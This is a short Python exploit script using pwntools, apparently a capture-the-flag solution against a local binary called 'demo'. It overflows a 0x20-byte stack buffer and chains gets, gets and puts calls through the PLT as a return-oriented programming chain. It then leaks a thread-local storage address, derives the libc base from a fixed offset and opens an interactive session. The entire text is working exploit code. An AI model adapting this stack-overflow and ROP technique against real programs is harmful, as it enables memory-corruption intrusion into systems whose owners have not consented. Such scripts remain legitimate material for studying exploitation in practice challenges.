from pwn import *

e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)

p.sendlineafter(b"ROP me if you can!\n", payload)

p.sendline(p32(0) + b"A"*4 + b"B"*8)
p.sendline(b"CCCC")

p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")

libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")

p.interactive()
